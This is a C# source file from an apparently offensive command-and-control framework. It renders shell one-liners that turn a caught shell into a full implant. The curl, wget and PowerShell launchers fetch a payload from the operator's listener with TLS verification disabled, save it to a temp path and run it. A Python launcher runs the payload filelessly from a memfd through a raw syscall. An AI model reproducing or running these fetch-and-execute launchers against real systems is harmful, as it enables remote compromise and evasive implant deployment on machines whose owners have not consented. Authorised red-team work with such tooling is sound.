namespace Rod.Transport.Listeners.ShellCatch;

/// <summary>
/// Renders the one-liners an operator pastes into a caught shell to grow it
/// into a real implant (architecture.md Sec 5.2, Sec 6, Sec 8). Each
/// launcher is the standard fetch-and-run shape the delivery flow
/// defines -- fetch the payload bytes over the engagement's web listener,
/// present the deployment credential, run what came back -- expressed in the
/// shell family the target is known or guessed to have. The disk-or-memory
/// choice is the operator's at paste time, not a build-time axis: every
/// artifact is a plain native executable with no self-reference, so the
/// Linux in-memory family renders beside the disk trio for every payload.
/// An https front's TLS terminates against the engagement CA, which no
/// stock target toolchain trusts (the implant pins it; curl and friends
/// verify against system stores), so the https spellings carry each
/// family's no-verify flag -- the credential gates the fetch, and the
/// fetched artifact's own enrollment pins the CA.
/// Pure rendering of (url, credential) into commands: the target-side
/// behavior is plain, documented fetch-execute in every family.
/// </summary>
public static class ShellUpgradeLaunchers
{
    /// <summary>One renderable launcher, named for the surface it is pasted into.</summary>
    public sealed record Launcher(string Id, string Os, string Command);

    /// <summary>
    /// Renders the launcher families for a payload fetch at
    /// <paramref name="url"/> authorized by <paramref name="secret"/>. Every
    /// family renders for every payload: the disk trio is the universal
    /// fallback (the shell fingerprint is a guess, and a family that lands a
    /// file beats one that cannot run at all), and every native binary runs
    /// from an anonymous fd, so the in-memory family rides along.
    /// </summary>
    public static IReadOnlyList<Launcher> Render(string url, string secret)
    {
        const string unixPath = "/tmp/.rod-payload";
        // The front's TLS terminates against the engagement CA -- one shared
        // leaf, CN=rod-listener, no SANs, an anchor no target-side
        // toolchain trusts by design (the implant pins the CA it baked;
        // stock tools verify against system stores) -- so an https fetch
        // renders with each family's transport-verification bypass. The
        // credential gates the fetch, and the fetched artifact enrolls only
        // against the CA it carries; a cleartext front needs no flag.
        var insecure = url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        var curlFlags = insecure ? "-kfsSL" : "-fsSL";
        var wgetFlags = insecure ? "-q --no-check-certificate" : "-q";
        // Windows PowerShell (the `powershell` binary, 5.1) has no
        // -SkipCertificateCheck on iwr; the ServicePointManager callback is
        // the bypass that interpreter honors.
        var psBypass = insecure
            ? "[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
            : "";
        List<Launcher> launchers =
        [
            new Launcher(
                "unix-curl",
                "linux",
                $"curl {curlFlags} -H 'X-Deploy-Token: {secret}' {url} -o {unixPath} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "unix-wget",
                "linux",
                $"wget {wgetFlags} --header='X-Deploy-Token: {secret}' {url} -O {unixPath} && chmod +x {unixPath} && {unixPath}"),

            new Launcher(
                "windows-powershell",
                "windows",
                "powershell -c \"" + psBypass
                    + "$p=\\\"$env:TEMP\\rod-payload.exe\\\";"
                    + $"iwr '{url}' -Headers @{{'X-Deploy-Token'='{secret}'}} -OutFile $p; & $p\""),
        ];

        // Every artifact is a plain ELF with no self-reference, so it runs
        // from an anonymous fd: python3 stages the fetched bytes in a memfd
        // and execs it through /proc/self/fd -- the documented fexecve
        // pattern -- and the payload never lands. os.memfd_create exists
        // only from Python 3.8 on and targets still run 3.6/3.7 stock, so
        // the fd comes from os.memfd_create where present and from the raw
        // syscall through ctypes otherwise, with the per-arch number the
        // kernel ABI fixes (319 on x86_64, 279 on aarch64).
        var pyImport = insecure ? "import os,ssl,urllib.request;" : "import os,urllib.request;";
        var pyContext = insecure ? "c=ssl._create_unverified_context();" : "";
        var pyOpen = insecure ? "urllib.request.urlopen(q,context=c)" : "urllib.request.urlopen(q)";
        var pyMemfd = "m=getattr(os,'memfd_create',None);"
            + "f=m('rod') if m else "
            + "__import__('ctypes').CDLL(None).syscall("
            + "{'x86_64':319,'aarch64':279}.get(os.uname().machine,319),b'rod',0);";
        launchers.Add(new Launcher(
            "unix-python-memfd",
            "linux",
            "python3 -c \"" + pyImport + pyContext
                + $"q=urllib.request.Request('{url}',headers={{'X-Deploy-Token':'{secret}'}});"
                + "d=" + pyOpen + ".read();"
                + pyMemfd
                + "os.write(f,d);"
                + "os.execv('/proc/self/fd/%d'%f,['rod-implant'])\""));

        return launchers;
    }
}
